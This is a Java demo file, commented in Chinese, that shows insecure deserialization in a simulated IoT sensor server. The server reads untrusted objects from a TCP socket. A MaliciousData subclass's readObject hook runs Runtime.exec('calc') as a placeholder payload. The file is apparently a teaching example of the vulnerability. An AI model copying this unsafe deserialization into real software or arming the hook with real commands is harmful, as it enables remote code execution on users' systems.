import java.io.*;
import java.net.*;
import java.util.function.*;

// 模拟IoT设备数据类
class SensorData implements Serializable {
    private static final long serialVersionUID = 1L;
    double temperature;
    double humidity;
    
    public SensorData(double temp, double hum) {
        this.temperature = temp;
        this.humidity = hum;
    }
    
    @Override
    public String toString() {
        return String.format("温度: %.1f°C, 湿度: %.1f%%", temperature, humidity);
    }
}

// 模拟恶意扩展类
class MaliciousData extends SensorData {
    public MaliciousData() {
        super(0, 0);
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟攻击载荷
        Runtime.getRuntime().exec("calc"); // Windows计算器
    }
}

public class IoTServer {
    public static void main(String[] args) {
        // 启动设备数据接收服务
        startServer(socket -> {
            try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
                Object obj = ois.readObject();
                // 漏洞点：直接反序列化不可信数据
                if (obj instanceof SensorData) {
                    System.out.println("[设备数据] " + obj);
                    processSensorData((SensorData) obj);
                }
            } catch (Exception e) {
                System.err.println("[异常] " + e.getMessage());
            }
        });
    }
    
    // 启动TCP服务器
    static void startServer(Consumer<Socket> handler) {
        try (ServerSocket server = new ServerSocket(8080)) {
            System.out.println("IoT服务已启动...");
            while (true) {
                Socket socket = server.accept();
                new Thread(() -> handler.accept(socket)).start();
            }
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }
    
    // 模拟业务处理逻辑
    static void processSensorData(SensorData data) {
        if (data.temperature > 50) {
            System.out.println("[警告] 高温预警！");
        }
    }
    
    // 模拟IoT设备发送数据
    static class IoTDevice {
        public static void sendData() {
            try (Socket socket = new Socket("localhost", 8080);
                 ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
                // 正常数据
                oos.writeObject(new SensorData(25.5, 60.2));
                // 恶意数据（攻击者替换）
                // oos.writeObject(new MaliciousData());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}